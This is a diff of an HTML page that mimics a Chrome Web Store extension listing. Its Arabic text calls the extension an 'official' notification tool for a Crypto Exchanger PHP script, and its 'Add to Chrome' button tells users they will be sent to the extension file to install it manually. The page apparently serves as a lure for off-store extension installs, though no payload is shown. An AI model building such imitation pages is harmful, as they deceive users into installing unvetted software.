@@ -1,74 +1,89 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8">
   <title>Allow notifications for messages</title>
   <style>
     body {
-      background-color: #fff;
       font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
+      background: #fff;
+      margin: 0;
+      padding: 0;
     }
 
-    .extension-box {
-      max-width: 400px;
-      margin: 0 auto;
-      border: 1px solid #ccc;
-      border-radius: 16px;
+    .container {
+      max-width: 800px;
+      margin: 40px auto;
       padding: 20px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
     }
 
-    .extension-box img.icon {
-      width: 100px;
-      height: 100px;
-      border-radius: 16px;
+    .extension-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 30px;
     }
 
-    .extension-box h1 {
-      font-size: 22px;
-      margin: 20px 0;
+    .extension-info {
+      text-align: left;
+    }
+
+    .extension-icon {
+      width: 120px;
+      height: 120px;
+      border-radius: 20px;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin: 10px 0 5px;
     }
 
     .add-button {
       background-color: #1a73e8;
       color: white;
       border: none;
-      padding: 10px 24px;
-      border-radius: 8px;
+      padding: 10px 20px;
+      border-radius: 5px;
       font-size: 16px;
       cursor: pointer;
-      margin-bottom: 20px;
-      transition: background 0.3s;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
 
     .add-button:hover {
-      background-color: #155ab6;
+      background-color: #1669c1;
     }
 
-    .preview-images {
+    .previews {
+      margin-top: 40px;
       display: flex;
       justify-content: center;
-      gap: 10px;
+      gap: 20px;
     }
 
-    .preview-images img {
-      width: 140px;
-      height: auto;
-      border-radius: 8px;
-      border: 1px solid #ddd;
+    .previews img {
+      width: 320px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
   </style>
 </head>
 <body>
 
-  <div class="extension-box">
-    <img src="icon.png" alt="Icon" class="icon">
-    <h1>Allow notifications for messages</h1>
-    <button class="add-button">Add to Chrome</button>
+  <div class="container">
+    <div class="extension-header">
+      <img src="icon.png" alt="Extension Icon" class="extension-icon">
+      <div class="extension-info">
+        <h1>تفعيل الإشعارات</h1>
+        <p>أداة رسمية لعرض إشعارات سكربت Crypto Exchanger PHP.</p>
+      </div>
+      <button class="add-button" onclick="alert('سيتم توجيهك إلى ملف الإضافة لتثبيتها يدويًا.')">
+        Add to Chrome
+      </button>
+    </div>
 
-    <div class="preview-images">
+    <div class="previews">
       <img src="preview1.png" alt="Preview 1">
       <img src="preview2.png" alt="Preview 2">
     </div>
